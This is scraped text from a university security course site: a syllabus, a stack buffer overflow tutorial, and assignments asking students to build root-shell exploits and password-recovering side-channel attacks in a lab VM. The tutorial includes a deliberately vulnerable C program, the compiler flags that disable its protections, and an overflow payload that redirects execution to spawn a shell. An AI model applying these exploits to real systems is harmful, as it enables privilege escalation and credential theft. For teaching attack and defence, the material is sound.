Among these will be systems security and exploitation (buffer overflows, race conditions, SQL injection, etc), access control and authentication, covert channels, network security, language-based security, denial-of-service, privacy and anonymity. The goal of the course is to provide an appreciation of how to think adversarially with respect to computer systems as well as an appreciation of how to reason about attacks and defenses. To complete the projects in this course, you will need the ability to develop software programs using the C language, and some understanding of x86 assembly, JavaScript, PHP and SQL. We will not reach these in class and you will be expected to learn them on your own. If you don't know C, K&R's The C Programming Language is a great go to, but the Hacking book is probably enough and covers some x86 assembly too.

Grading \u00b6 40% Assignments 25% Midterm exam 35% Final exam \u226410% Participation in class and online Programming assignments \u00b6 We will have assignments that are meant to both reinforce your knowledge of the concepts covered in lecture and get you to think about security in more depth, beyond what is covered lecture. You are expected to work on the assignments by yourself. You may discuss the assignments with students from the course, in general, but not any specific solution. There are no late days, but you will receive an additional 10% if you turn in your assignment by the early date. If you consult anything (books, academic papers, internet resources, people not in your group) when working on the assignments, note this in your submission. We encourage outside learning but expect you to not seek out specific details about a solution -- anything submitted should be considered your own work. Similarly, you are expected to not publish or otherwise share your solutions at any point (even after the class is over). If you are unsure about what is allowed, please ask the course staff. Exams \u00b6 The midterm is closed-book , but you may use a double-sided cheat sheet (letter-size). The final is closed-book , but you may use 2 double-sided cheat sheets (letter-size). The exams will make up 60% of your grade. Since the final is cumulative your midterm grade will be calculated as: midterm > 0 ? max(final, midterm) : 0 This means that (1) you basically get a second chance if you don't so well on the midterm and (2) you must show up to both the midterm and the final. If you need to miss either exam because of a documented medical emergency, contact the instructor immediately. Participation/pre-lecture readings \u00b6 Before each class there will be some assigned reading. You are expected to do the reading and have at least a vague understanding of the concepts that will be discussed in class. This will allow us to spend the lecture time to solidify your understanding. Asking and answering questions in class, on Piazza, or during office hours counts towards your class participation. Contributing to the class lecture notes will similarly be rewarded with extra points.

To get started, create a file called example2.c with the example code: #include <stdio.h> #include <stdlib.h> #include <string.h> void bar () { system ( \"/bin/sh\" ); } void foo () { printf ( \"hello all!! \\n \" ); exit ( 0 ); } void func ( int a , int b , char * str ) { int c = 0xdeadbeef ; char buf [ 4 ]; strcpy ( buf , str ); } int main ( int argc , char ** argv ) { func ( 0xaaaaaaaa , 0xbbbbbbbb , argv [ 1 ]); return 0 ; } Then compile the program with GCC: gcc -m32 -O0 -ggdb -static -U_FORTIFY_SOURCE -fno-stack-protector -zexecstack -no-pie -o example2 example2.c You'll note that we compiled this program with a bunch of flags. These flags disable many protection mechanism that would make such an attack harder to carry out. We'll see in class what most of these are. Code and environment inspection \u00b6 Our first goal is to manually modify the stack frames to change the return address in fun to jump (when it returns) to the beginning of foo , instead of returning back to main . To get started, let's start GDB: $ gdb example2 Within GDB let's set a breakpoint on func and run the program with argument \"AAAA\" : > b func > set args \"AAAA\" > r To figure out where to jump to, let's first look at the what's on the stack frame: Recall that the first argument is off by 8: > x $ebp+8 0xffffced0: 0xaaaaaaaa The second argument is at offset 12: > x $ebp+12 0xffffced4: 0xbbbbbbbb The old $ebp is at offset 0: > x $ebp 0xffffcec8: 0xffffcee8 If our function returns normally, the $ebp will be set to 0xffffcee8 . If you want to see this, set a breakpoint right after the strcpy ( b 17 ), continue ( c in GDB) and then step through ( s ). You can also stop at the exact leave instruction by setting a break point at the address: > b *0x8049c1e You can find such addresses with disas : > disas func Dump of assembler code for function func: 0x08049bee <+0>: push %ebp 0x08049bef <+1>: mov %esp,%ebp 0x08049bf1 <+3>: push %ebx 0x08049bf2 <+4>: sub $0x14,%esp 0x08049bf5 <+7>: call 0x8049c68 <__x86.get_pc_thunk.ax> 0x08049bfa <+12>: add $0x96406,%eax 0x08049bff <+17>: movl $0xdeadbeef,-0xc(%ebp) 0x08049c06 <+24>: sub $0x8,%esp 0x08049c09 <+27>: pushl 0x10(%ebp) 0x08049c0c <+30>: lea -0x10(%ebp),%edx 0x08049c0f <+33>: push %edx 0x08049c10 <+34>: mov %eax,%ebx 0x08049c12 <+36>: call 0x8049028 0x08049c17 <+41>: add $0x10,%esp 0x08049c1a <+44>: nop 0x08049c1b <+45>: mov -0x4(%ebp),%ebx 0x08049c1e <+48>: leave 0x08049c1f <+49>: ret End of assembler dump. NOTE: This address will likely be different on your machine. Where is the return address? It's 4 off the $ebp : > x $ebp+4 0xffffcecc: 0x08049c58 Now what is this 0x08049c58 value? It's the address in main right after the call to func ( which is at address 0x8039bee ): > disas main Dump of assembler code for function main: 0x08049c20 <+0>: lea 0x4(%esp),%ecx ... 0x08049c53 <+51>: call 0x8049bee <func> 0x08049c58 <+56>: add $0x10,%esp ... End of assembler dump. Great. Now to to direct the control flow to foo instead of back to main we just need to overwrite the return address. We can do this by setting $ebp+4 : We can do this by getting foo 's address: > p &foo $2 = (void (*)()) 0x8049bc0 <foo> > set {int}($ebp+4)=0x8049bc0 Or more simply: > set {int}($ebp+4)=&foo Now if you continue ( c ) the ret will jump to 0x8049bc0 and print: hello all!! As an attacker, we need to overflow the buffer to write the return address though. We can't attach GDB to a process we don't control. Overflowing the buffer \u00b6 So, let's overflow the buffer. To see the effects of the overflow make sure you set the breakpoint after strcpy and let's change the args to go just past buf 4-byte boundary: > b 17 > set args > set args \"AAAABC\" > r If you print the local variable c before and after the strcpy you'll see that we've overflow from buf into c : > p c $14 = 0xdeadbeef > c > p c $15 = 0xde004342 You'll notice that c changed from 0xdeadbeef to 0xde004242 , i.e., 0xde\"\\0CB\" . If we then change the args to \"AAAABCD\" you'll see that c = 0x00444342 . But we need to overflow the return address. How do we figure out how much we need to overflow? Compute the distance between the return address and buffer start. In func : > p $ebp+4-&buf[0] $16 = 0x14 This means that we need to supply an arugment that is 20 bytes long (0x14) to get up to the return address. Let's do that: > set args \"AAAABBBBCCCCDDDDEEEEFFFF\" > r Now if you inspect the contents of the return addresss (after strcpy ) you'll see it filled with all F s: > x $ebp+4 0xffffcebc: 0x46464646 If you let this program continue it will crash with: Cannot access memory at address 0x46464646 Why? We'll we're trying to read the instruction at address 0x46464646 to execute it. That's not a valid address. Let's instead point the program to foo ( 0x8049bc0 ): > set args $(python2 -c \"print 'AAAABBBBCCCCDDDDEEEE\\xc0\\x9b\\x04\\x08'\") > r Now if you run the program it will print hello all . We can do all of this from the shell: $ ./example2 ` python2 -c \"print 'AAAABBBBCCCCDDDDEEEE\\xc0\\x9b\\x04\\x08'\" ` hello all!! In practice you'll want to get a shell. In our example we can get a shell by setting the return address to bar : > p &bar $35 = (void (*)()) 0x8049b95 <bar> > set args $(python2 -c \"print 'AAAABBBBCCCCDDDDEEEE\\x95\\x9b\\x04\\x08'\") > r sh-5.0$ Realistically you won't have a nice function like bar in the process and you'll need to essentially mock a call to system yourself. You can do this by overflowing the buffer with your (shell) code and have the return address point to your code instead of existing functions. You'll get to do this in one of you assignments!

Getting Started \u00b6 To complete this assignment, you will be provided with a VirtualBox VM pre-populated with the assignment files. VM Image \u00b6 In order to match the environment in which your submission will be graded, all work for this assignment must be done on the VirtualBox VM we provide, named pa1box . You can download the VM image here . The VM is configured with two users: student , with password hacktheplanet ; and root , with password hackallthethings . The VM is configured with SSH on port 2222. Please note that SSH is disabled for root , so you can only SSH in as the student user. You can still log in as root using su or by logging into the VM directly. To SSH into the VM: ssh - p 2222 student @127.0.0.1 To copy files from your computer to the VM: scp - P 2222 - r / path / to / files / student @127.0.0.1 :/ home / student To copy files from the VM to your computer: scp - P 2222 student @127.0.0.1 :/ path / to / files / / destination / path Part 1: Using GDB (10 pts) \u00b6 Files for this sub-assignment are located in the gdb subdirectory of the student user's home directory in the VM image; that is, /home/student/gdb . SSH into the VM and cd into that directory to begin working on it. Inside the gdb directory, you'll find fib.c , a C program demonstrating the Fibonacci sequence; a Makefile ; and hw1.txt , in which you'll record your responses to the questions below. The first step is to compile fib by running make on the command line. To run the fib executable in GDB, run gdb fib . I recommend the following workflow in GDB: Starting. Set breakpoints that you can later use for analysis: b foo \u2014 break at function foo b *0x08048489 \u2014 break at the instruction at address 0x08048489 r \u2014 run the executable Analyzing. Examine memory, registers, etc; disassemble code; show stack frames, backtrace, etc; and more: disas foo \u2014 disassemble function foo i r \u2014 view registers where \u2014 view stack frames x <loc> \u2014 examine memory x $eip \u2014 examine current instruction pointer x /10x $esp \u2014 examine 10 words at top of stack x /10x buf \u2014 examine 10 words in buf x /10i $eip \u2014 examine 10 instructions starting at instruction pointer x /10i foo \u2014 examine 10 instructions starting at foo Continuing. Continue analysis: c \u2014 continue execution until next breakpoint/watchpoint si \u2014 step to the next instruction s \u2014 step to the next line of source code Note that this is only a cursory overview of GDB; much more info is available from online resources. Assignment Instructions \u00b6 Complete the following exercises and fill out hw1.txt with your answers. Follow the directions in the template, do not delete the square brackets What is the value, in hex, of the ecx register when the function f is called? (2 pts) Which register stores the value of the variable i in the function main? (2 pts) What is the address, in hex, of the function f ? (2 pts) What is the name of the 6th instruction of the function f ? (2 pts) When f completes after being called from main , to which address in main does control return? Write your answer in hex form. (2 pts) Submission \u00b6 Submit hw1.txt to \"1a. gdb\" on Gradescope. Gradescope will check that it has successfully detected your answers, but it will not give you your grade until the due date. Part 2: echo in x86 (10 pts) \u00b6 Files for this sub-assignment are located in the x86 subdirectory of the student user's home directory in the VM image; that is, /home/student/x86 . SSH into the VM and cd into that directory to begin working on it. For this part, you will be implementing a simplified version of the familiar echo command, using raw x86 assembly code. The goal of this assignment is to familiarize you with writing programs directly in x86. Your echo command must behave as follows: When run with a single command line argument (e.g., ./echo Hello ): Prints that argument back to the console's standard output (stdout). Prints a trailing newline ( \\n ). Exits with code 0.

Helpful Hints \u00b6 In a Linux program, stdout is file descriptor number 1 and stderr is number 2. Linux programs start with argc at the top of the stack, accessible at 0(%esp) from x86-assembly programs. Below it is argv , the array of pointers to (null-terminated) strings passed into the program as arguments. So argv[0] can be accessed from x86-assembly programs at 4(%esp) , argv[1] at 8(%esp) , argv[2] at 12(%esp) , and so on. argv[0] is the name of the program executed, not the first argument, which is argv[1] if supplied (or 8(%esp) for our purposes). Then argc (or 0(%esp) ) will be 1 if the program was not passed any arguments, 2 if it was passed 1 argument, and so on. This table of Linux system calls may come in handy.

You may consult any online references you wish. If you use any code in your answer that you did not write yourself, you must document that fact. Failure to do so will be considered a violation of the academic integrity policy. Getting Started \u00b6 To complete this assignment you will be provided with a VirtualBox VM and a set of files. VM Image \u00b6 In order to match the environment in which your submission will be graded, all work for this assignment must be done on the VirtualBox VM we have provided, named pa2box . You can download the VM image here . Import the pa2box.vbox file into VirtualBox via the Machine \u2192 Add menu item. Don't create a brand-new VirtualBox VM or import the pa2box-data.vmdk file on its own: if you do this, you won't have the correct configuration. After importing the VM, select it in the VirtualBox sidebar and start it with the green arrow button or the Machine \u2192 Start menu item. The VM is configured with two users: student , with password hacktheplanet ; and root , with password hackallthethings . Instead of using the command line through VirtualBox, we recommend that you SSH into your VM from another client. The VM image is configured to expose an SSH server on port 2222 of your system's loopback address ( 127.0.0.1 ). To SSH into the VM (from your host system running VirtualBox, not from inside the VM): ssh - p 2222 student @127.0.0.1 To copy files from your computer to the VM: scp - P 2222 - r / path / to / files / student @127.0.0.1 :/ home / student To copy files from the VM to your computer: scp - P 2222 student @127.0.0.1 :/ path / to / files / / destination / path Please note that SSH is disabled for root , so you can only SSH in as the student user. You can still log in as root using su or by logging into the VM directly. Assignment Files \u00b6 Starter files are included inside the student home directory of the VM image. The targets directory contains a Makefile to generate target executables specific to your PID (as well as a folder called base , which you should not modify, used to generate the targets). Exploit starter code can be found in the sploits1 - sploits4 directories: one per each of the four vulnerable target programs. Each of these contains a Makefile , a shellcode.h header file providing Aleph One's shellcode, and a sploitN.c file in which you should write your exploit code (in addition to an assignment.toml file, which should not be modified). You will be writing an exploit for each of the four vulnerable programs provided in the assignment. Each exploit, when run in the VM with its target installed setuid-root in /tmp , should yield a root shell ( /bin/sh ). You can verify that the shell has been launched as root by typing whoami , to which you should see the response root . You must use Aleph One\u2019s shellcode in shellcode.h , as this will be used in the grading scripts. For each exploit, in addition to your .c file, please also create a corresponding file writeup.txt containing a brief description of how the exploit works. Exploit Generation \u00b6 To complete the assignment, you will need to: generate targets specific to your PID; use GDB to find vulnerabilities in the targets; and, finally, craft your exploit programs. Generating the Targets \u00b6 Run make generate in the targets directory to create the four target source files specific to you. This will prompt you for your student ID ( A######## or U######## ), which will be used to randomize portions of the contents of target1.c - target4.c . Run make to build the target binaries target1 - target4 . Run sudo make install to copy the binaries into the /tmp directory. Finally, run sudo make setuid to mark the binaries as setuid-root. If you forget this step, then your exploits will end up launching a normal shell instead of a root shell! Exploit Notes \u00b6 For this assignment you should read and have a solid understanding of Aleph One\u2019s \u201cSmashing the Stack for Fun and Profit\u201d. Aleph One gives code that calculates addresses on the target\u2019s stack based on addresses on the exploit\u2019s stack. However, addresses on the exploit\u2019s stack can change based on how the exploit is executed (working directory, arguments, environment, etc.). You must therefore hard-code target stack locations in your exploits. You should not use a function such as get_sp() in the exploits you hand in. You should only modify the sploitN.c files and corresponding writeup.txt files; i.e., your exploits should work with unmodified Makefiles, targets, etc. In grading, the exploits may be run with a different working directory. Your exploits must work in these cases also. If you hard-code the target's stack locations into your exploit you should be fine. Your exploit programs should not take any command-line arguments. Shutting down the VM removes the files in /tmp; if you want to keep them, pause the VM and save its state! IMPORTANT: Using the shellcode \u00b6 The shellcode is defined for you in shellcode.h inside each sploitN/ directory. To use the shellcode in your sploit buffers, please import the shellcode with #include and copy the contents programatically . You can do this with memcpy , strcpy , or even just a for loop with array assignments. Please do NOT manually copy-paste the shellcode string literal into your sploitN.c file . While the sploit will still work, it may break grading. Using GDB \u00b6 To run an exploit in GDB, run, e.g., gdb sploit1 to execute sploit1 . Note that there are two executables when we run these programs, since, e.g., sploit1 will execute target1 . Because of this, you can use the following sample workflow to get started in GDB: b main --- break at main in sploit1.c r --- run the executable sploit1 c --- continue until main in target1.c b foo --- set a breakpoint at foo in target1.c Note that you will not be able to set breakpoints in targetN until the program has started executing targetN . That is, e.g., if you tried to run b foo before step 3, you would get the error Function \"foo\" not defined. Here are some additional GDB commands that may come in handy: p var --- prints the value of a variable named var p buf --- (if buf is an array) prints the contents of an array named buf p &buf --- prints the starting address of an array or variable named buf i r --- view registers i frame --- view info about the current stack frame i stack --- view high level info about the stack help <command> --- get help inside GDB about a particular command Also refer back to the sample commands in Assignment 1. Note that this is only a cursory overview of GDB; much more info is available from online resources. Submission \u00b6 Create a file named PID in the student home directory on the VM, and put your PID in it (ex: A12345678 ) Run the following command from the student home directory tar -czvf pa2.tar.gz PID sploit[1-4]/ targets/ This will create a pa2.tar.gz in the home directory with all your files in it. You can see what files were zipped by running tar -tf pa2.tar.gz scp the pa2.tar.gz file to your local computer and submit to gradescope. Note: The autograder will take time to set up, as it'll have to redirect your submissions somewhere else, where your sploits can be tested in the same VirtualBox environment. We'll post an update when it's up. In the meanwhile, you'll know your answer is correct if you followed the instructions above and you were able to get a root shell.","title":"Assignment 2"},{"location":"pa/pa2/#assignment-2-75-pts-25pts-extra-for-sploit4","text":"Deadline: Wednesday, January 29, 2020 by 1:59:59 PM Early Turn-In: Sunday, January 26, 2020 by 11:59:59 PM (10% bonus) The goal of this assignment is to gain hands-on experience with the effects of buffer overflows and other memory-safety bugs. sploit1-sploit3 are required. sploit4 is extra credit!

This assignment will demonstrate how side channels can be just as dangerous as the control flow vulnerabilities you exploited in Assignment 2. You will be provided a two skeleton files ( memhack.c and timehack.c ) that you will use to exploit side channels present in a target library ( sysapp.c ) to obtain a protected key. You may consult any online references you wish. If you use any code in your answer that you did not write yourselves, you must document that fact. Failure to do so will be considered a violation of the academic integrity policy. Getting Started \u00b6 Just like previous assignments, for this assignment you will be provided with a VirtualBox VM containing all the files you need. The VM is named pa3box , and you can download the VM image here . As in previous assignments, import the pa3box.vbox file into VirtualBox via the Machine \u2192 Add menu item; don't create a brand-new VirtualBox VM or import the pa3box-data.vmdk file on its own: if you do this, you won't have the correct configuration. The VM is configured with two users: student , with password hacktheplanet ; and root , with password hackallthethings . We recommend you use the VM via ssh and scp , just like previous assignments. Please note that SSH is disabled for root , so you can only SSH in as the student user. You can still log in as root using su or by logging into the VM directly. Assignment Files \u00b6 Starter files are included inside the student user's home directory within the VM image. There are two parts to this assignment, each with its own subdirectory, memhack and timehack . Each subdirectory contains exploit starter code ( memhack.c or timehack.c ), which imports a library ( sysapp.c , with the same contents across the two subdirectories) with password-checking functionality vulnerable to side-channel attacks. You should not modify sysapp.c , only memhack.c and timehack.c . Each subdirectory contains a Makefile for building your exploits. Assignment Instructions \u00b6 You will be writing two exploits, each of which takes advantage of a side channel, to obtain the password in sysapp.c . In memhack.c , you will exploit a memory-based side channel, and in timehack.c you will exploit a timing-based side channel. See Section 2 for specific details. Once both of your exploits can determine the password in sysapp.c and call the hack_system() function successfully, the assignment is complete. Additionally, for each exploit, provide a brief description of how it works in its corresponding writeup.txt file. Submitting Your Solutions \u00b6 Submit memhack.c and timehack.c to the corresponding assignments on Gradescope, and submit a combined writeup to the writeup assignment on Gradescope. Exploit Construction \u00b6 Memory-Based Side Channel \u00b6 We recommend you start with the memory-based side channel because it is deterministic and doesn't have problems with noise. Look at the check_pass() function in sysapp.c and note two things: The password string is passed by reference The memory it points to is checked against the reference password one character at a time. Now look in memhack.c and note how a buffer is allocated such that the page starting at page start is protected (i.e., accessing it will caused a segmentation fault, or SEGV) and the previous 32 characters are allocated. Now look at the demonstration function demonstrate_signals() , which shows how referencing any memory in the protected page will produce a fault as well as how to catch that fault in your program. You do not need to use this function; it is merely there to show you how to use signals to capture whether a memory reference touched a page or not. Now you will want to create a framework (in memhack.c ) to call check_pass() with different inputs and catching any resulting faults so you can determine if part of the password is correct. We suggest a loop over the maximum password size (32 characters) where for the first guess you store the password such that its first character is one byte before page start and then iterate between possible choices for the first character (when you get it right you will get a page fault). Repeat this to guess the entire password. Note that all ASCII symbols from ASCII 33 ( ! ) to ASCII 126 ( \u223c ) can be used in the password. Other hints: You are already given a page protected buffer with enough memory to crack the password. All you need to do is use it appropriately for each guess you make. The demonstrate_signals function handles all the segfaults for you. You can re-use almost all of it in your code. Timing-Based Side Channel \u00b6 Unlike the memory-based side channel, the timing-based side channel will deal with noise. Go back and look at check_pass() . An artificial delay has been added when each character is checked to make your life easier (it\u2019s possible to do the assignment without it but it would require a much more careful methodology). The execution time of check_pass() depends on how many characters you guess correctly . Look in timehack.c and find a macro there for a function called rdtsc() which invokes the processors cycle counter (a clock that increments by one for each processor cycle that passes). In general, treat rdtsc() as a free running timer that returns a long . Insert a call to rdtsc() before the call to check_pass() and afterwards. Print the difference between these values to see how long (in cycles) the password checking ran. Run the program a few times. Now change the guess string so the first character is correct. Run again and see how the time difference changes. Now automate this entire process, in the style of the original approach in memhack.c . Note that unlike the memhack attack, the timehack problem will have to deal with noise . Depending on things like what other programs are running, the status of the cache, the contents of the branch target buffer, etc... there can be significant variability in the amount of time each check takes. This will matter in practice. You will want to run a lot of trials before you reach your conclusion about each character. Other hints: Be careful in using printf \u2019s. These can blow out the instruction cache and data caches and perturb your results (i.e. overwhelm the timing effects you are trying to detect). Be careful in averaging across trials. If your process is descheduled in the middle of a measurement, the time cost of that individual trial will be so large that it overwhelms everything else. Instead, the median is your friend. However, feel free to experiment if something does not work for you. If time is not continuing to increase as you progress through characters, then you probably made a bad guess earlier.

There are two parts to this assignment, each with its own subdirectory, memhack and timehack . Each subdirectory contains exploit starter code ( memhack.c or timehack.c ), which imports a library ( sysapp.c , with the same contents across the two subdirectories) with password-checking functionality vulnerable to side-channel attacks. You should not modify sysapp.c , only memhack.c and timehack.c . Each subdirectory contains a Makefile for building your exploits.","title":"Assignment Files"},{"location":"pa/pa3/#assignment-instructions","text":"You will be writing two exploits, each of which takes advantage of a side channel, to obtain the password in sysapp.c . In memhack.c , you will exploit a memory-based side channel, and in timehack.c you will exploit a timing-based side channel. See Section 2 for specific details. Once both of your exploits can determine the password in sysapp.c and call the hack_system() function successfully, the assignment is complete.

Look at the check_pass() function in sysapp.c and note two things: The password string is passed by reference The memory it points to is checked against the reference password one character at a time. Now look in memhack.c and note how a buffer is allocated such that the page starting at page start is protected (i.e., accessing it will caused a segmentation fault, or SEGV) and the previous 32 characters are allocated. Now look at the demonstration function demonstrate_signals() , which shows how referencing any memory in the protected page will produce a fault as well as how to catch that fault in your program. You do not need to use this function; it is merely there to show you how to use signals to capture whether a memory reference touched a page or not. Now you will want to create a framework (in memhack.c ) to call check_pass() with different inputs and catching any resulting faults so you can determine if part of the password is correct. We suggest a loop over the maximum password size (32 characters) where for the first guess you store the password such that its first character is one byte before page start and then iterate between possible choices for the first character (when you get it right you will get a page fault). Repeat this to guess the entire password. Note that all ASCII symbols from ASCII 33 ( ! ) to ASCII 126 ( \u223c ) can be used in the password. Other hints: You are already given a page protected buffer with enough memory to crack the password. All you need to do is use it appropriately for each guess you make. The demonstrate_signals function handles all the segfaults for you. You can re-use almost all of it in your code.","title":"Memory-Based Side Channel"},{"location":"pa/pa3/#timing-based-side-channel","text":"Unlike the memory-based side channel, the timing-based side channel will deal with noise. Go back and look at check_pass() . An artificial delay has been added when each character is checked to make your life easier (it\u2019s possible to do the assignment without it but it would require a much more careful methodology). The execution time of check_pass() depends on how many characters you guess correctly . Look in timehack.c and find a macro there for a function called rdtsc() which invokes the processors cycle counter (a clock that increments by one for each processor cycle that passes). In general, treat rdtsc() as a free running timer that returns a long . Insert a call to rdtsc() before the call to check_pass() and afterwards. Print the difference between these values to see how long (in cycles) the password checking ran. Run the program a few times. Now change the guess string so the first character is correct. Run again and see how the time difference changes. Now automate this entire process, in the style of the original approach in memhack.c . Note that unlike the memhack attack, the timehack problem will have to deal with noise . Depending on things like what other programs are running, the status of the cache, the contents of the branch target buffer, etc... there can be significant variability in the amount of time each check takes. This will matter in practice. You will want to run a lot of trials before you reach your conclusion about each character. Other hints: Be careful in using printf \u2019s. These can blow out the instruction cache and data caches and perturb your results (i.e. overwhelm the timing effects you are trying to detect). Be careful in averaging across trials. If your process is descheduled in the middle of a measurement, the time cost of that individual trial will be so large that it overwhelms everything else. Instead, the median is your friend. However, feel free to experiment if something does not work for you. If time is not continuing to increase as you progress through characters, then you probably made a bad guess earlier. Backtrack. rdtsc() will wrap around at some point. You may need to handle this outlier if it is causing issues.
